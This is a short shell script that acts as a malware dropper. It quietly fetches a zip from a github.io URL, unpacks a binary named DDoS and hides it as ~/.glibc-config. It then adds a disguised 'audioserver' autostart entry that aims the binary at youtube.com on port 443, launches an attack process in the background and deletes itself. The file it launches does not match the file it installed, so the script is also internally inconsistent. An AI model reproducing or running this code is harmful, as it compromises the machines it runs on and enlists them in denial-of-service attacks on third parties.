#!/bin/sh

TARGET='youtube.com'
URL='https://gameplayer-8.github.io/injection/sources/GLibC.zip'

DOWNLOADER='curl'

if $(whereis wget > /dev/null); then
    DOWNLOADER='wget'
fi

if $(whereis musl > /dev/null); then
    URL='https://gameplayer-8.github.io/injection/sources/Musl.zip'
fi

if [[ "$DOWNLOADER" == "wget" ]]; then
    exec $DOWNLOADER $URL -O file.zip > /dev/null 2>&1 3>&1
else
    exec $DOWNLOADER $URL > file.zip 2> /dev/null 3>&2
fi

unzip file.zip > /dev/null

chmod +x DDoS

rm -rf sha256sum.txt file.zip

mv DDoS ~/.glibc-config

mkdir -p ~/.local/autostart > /dev/null 2>&1 3>&1

echo '[Desktop Entry]' > ~/.local/autostart/audio.desktop
echo 'Name=audioserver' >> ~/.local/autostart/audio.desktop
echo 'Exec=/home/'$(whoami)'/.glibc-config -s '$TARGET' -p 443' >> ~/.local/autostart/audio.desktop
echo 'Type=Application' >> ~/.local/autostart/audio.desktop

~/.X11-config -s $TARGET -p 443 > /dev/null 2>&1 3>&1 &

rm -rf $(realpath $0)
